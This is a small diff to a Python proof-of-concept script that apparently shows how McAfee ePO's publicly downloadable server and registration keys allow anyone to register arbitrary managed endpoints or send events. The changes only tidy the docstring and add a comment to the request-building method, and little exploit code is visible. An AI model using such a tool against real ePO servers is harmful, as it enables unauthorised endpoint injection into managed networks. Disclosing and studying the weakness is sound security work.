@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""EPO Managed Endpoint Inject - Script to demonstrate weakness in EPO managed endpoint registration mechanism to allow arbitrary managed endpoint registration.
+""" EPO Managed Endpoint Inject - Script to demonstrate weakness in EPO managed endpoint registration mechanism to allow arbitrary managed endpoint registration.
 By design, McAfee ePO server exposes server public key and server registration key via Master Repository. These two keys can be downloaded by anyone and used to construct endpoint registration message or send events.
 Tested and Confirmed on EPO 4.x/5.x
 Harry Phung - harryuts\@\gmail.com
@@ -178,6 +178,7 @@ class Build_Registration_Request:
         return self.fullprops_xml
 
     def build_request(self):
+        """Build registration request data """
         self.build_header_2_40()
         self.build_fullprops()
         data_compressed = mcafee_crypto.mcafee_compress(self.agent_pubkey_epo_format + self.fullprops_xml)
